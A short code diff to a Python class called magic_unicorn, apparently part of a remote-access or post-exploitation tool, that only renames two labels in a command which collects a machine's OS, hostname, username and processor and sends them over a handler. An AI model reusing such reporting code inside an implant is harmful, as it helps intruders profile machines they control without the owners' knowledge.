@@ -91,8 +91,8 @@ class magic_unicorn:
     def command_sysinfo(self):
         sysinfo = ""
         sysinfo += f"{self.badges.I}Operating System: {platform.system()}\n"
-        sysinfo += f"{self.badges.I}Computer Name: {platform.node()}\n"
-        sysinfo += f"{self.badges.I}Username: {getpass.getuser()}\n"
+        sysinfo += f"{self.badges.I}Computer Hostname: {platform.node()}\n"
+        sysinfo += f"{self.badges.I}Computer Username: {getpass.getuser()}\n"
         sysinfo += f"{self.badges.I}Release Version: {platform.release()}\n"
         sysinfo += f"{self.badges.I}Processor Architecture: {platform.processor()}"
         self.handler.send(sysinfo.encode("UTF-8"))
